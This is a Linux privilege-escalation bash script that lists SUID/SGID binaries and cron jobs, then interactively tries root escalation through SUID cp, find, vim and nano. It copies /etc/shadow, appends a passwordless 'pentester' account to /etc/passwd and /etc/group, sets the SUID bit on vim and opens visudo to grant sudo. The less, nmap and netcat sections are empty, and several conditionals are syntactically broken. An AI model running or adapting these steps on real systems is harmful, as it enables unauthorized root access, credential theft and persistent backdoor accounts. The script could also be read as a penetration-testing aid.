#!/bin/bash

# This script is for finding commands with root SUID permissions and printing info for possible exploitation

suid=$(/usr/bin/find / -perm -u=s -type f 2>/dev/null)
guid=$(/usr/bin/find / -user root -perm 2000 -print 2> /dev/null)
exploit_cmds=(nmap vim find netcat less cp nano)

/bin/echo "=================================================================="
/bin/echo "|            LINUX COMMON PRIVESC CHECK RESULTS                  |"
/bin/echo "=================================================================="

for i in "${exploit_cmds[@]}"
do 
	results=$(/bin/grep -q "${i}" <<< "$suid" && /usr/bin/printf "$i root method is possibly exploitable!\n" || /usr/bin/printf "$i ""root method is not exploitable\n")
	/bin/echo "${results[*]}"
done


/bin/echo "=================================================================="
/bin/echo "|           SUID File List Located in PWD File suid.txt          |"
/bin/echo "------------------------------------------------------------------"
/bin/echo "$suid" > "$(pwd)/suid.txt" 
/bin/echo "=================================================================="
/bin/echo "|           GUID File List Located in PWD File guid.txt          |"
/bin/echo "=================================================================="
/bin/echo "$guid" > "$(pwd)/guid.txt"
/bin/echo "=================================================================="
/bin/echo "|                   CRON JOBS ON MACHINE                         |"
/bin/echo "|----------------------------------------------------------------|"
/bin/echo "$(/bin/ls --color=auto -las /etc/cron.d)"
/bin/echo "=================================================================="
/bin/echo "|                CRON JOB SCRIPT CONTENTS                        |"
/bin/echo "------------------------------------------------------------------"
/usr/bin/find /etc/cron.d -type f -exec cat {} \; | /usr/bin/awk '$1 ~ /^[^;#]/' | /bin/sed G   
/bin/echo "=================================================================="

for ex in "$exploit_cmds"
do
	privesc_available=$(/bin/echo $results | /bin/grep -q "$ex root method is possibly exploitable!")
	if [ $privesc_available ]
	then
		exploit_options=echo "Would you like to attempt privesc using $ex?  "
		options=("Yes Attempt PrivEsc " "No I am Just Testing ")

		select opt in "${options[@]}"
		do
			case $opt in
				"Yes Attempt PrivEsc ")
					/bin/echo "Attempting privesc using $ex SUID bit..."
					;;
				"No I am Just Testing ")
					/bin/echo "you chose to not attempt $ex privesc."
					break
					;;
			esac
		done
		
		# cp suid privesc method
		if [ $ex | /bin/grep "cp" ]
		then
			/bin/echo "Copy a users password hash from the /etc/shadow file and crack it or pass it"
			/bin/sleep 5s
			/bin/cp /etc/shadow /tmp/shadowread
			/bin/cp /etc/passwd /tmp/passwdread
			/bin/cp /etc/passwd /tmp/groupread
			/bin/echo "pentester:*:1002:1003:,,,:/home/pentester:/bin/bash" >> /tmp/passwdread
			/bin/echo "pentester:*:1003:" >> /tmp/groupread
			/bin/cp /tmp/groupread /etc/group
			/bin/cp /tmp/passwdread /etc/passwd
			echo "Username: pentester"
			echo "No password set for pentester. Password must be set. "
			passwd pentester
			echo "If the passwd command above did not work in setting the password try the below command and then su as pentester."
			echo "openssl passwd -1 -salt pentester P@ssw0rd1!"
		fi
		
		# find suid privesc method
		if [ $ex | /bin/grep "find" ]
		then
			/usr/bin/touch test
			/usr/bin/find test -exec "whoami" \;
			/bin/echo "Issue commands as root using the below syntax."
			/bin/echo "/usr/bin/find test -exec \"<command here> \" \\;"
		fi

		# less suid privesc method

		
		# nmap suid privesc method


		# netcat suid privesc method


		# vim suid privesc method
		if [ $ex | /bin/grep "vim" ]
		then
			/bin/ls -la --clor=auto /usr/bin/vim
			/bin/ls -la --color=auto /usr/bin/alternatives/vim
			/bin/chmod u+s /usr/bin/vim.basic
			/bin/echo "visudo command is going to run in 5 seconds"
			/bin/echo "Give "$(whoami)" sudo permissions by adding the following to the sudoers file."
			/bin/echo "$(whoami) ALL=(ALL:ALL) ALL"
			/bin/sleep 5s
			/usr/sbin/visudo 
		fi

		# nano suid privesc method
		if [ $ex | /bin/grep "" ]
		then
			/bin/echo "Copy the password hash from the shadow file and crack it or pass it."
			/bin/sleep 5s
			/bin/nano /etc/shadow
			/bin/echo 'Or try adding a wildcard character in the second field of the /etc/passwd file to remove a users existing password.'
			echo "You have 10 seconds to copy the below line to paste into the /etc/passwd file that is about to open for editing."
			echo "pentester:*:1002:1003:,,,:/home/pentester:/bin/bash"
			/bin/sleep 10s
			/bin/nano /etc/passwd
		fi
	fi
done
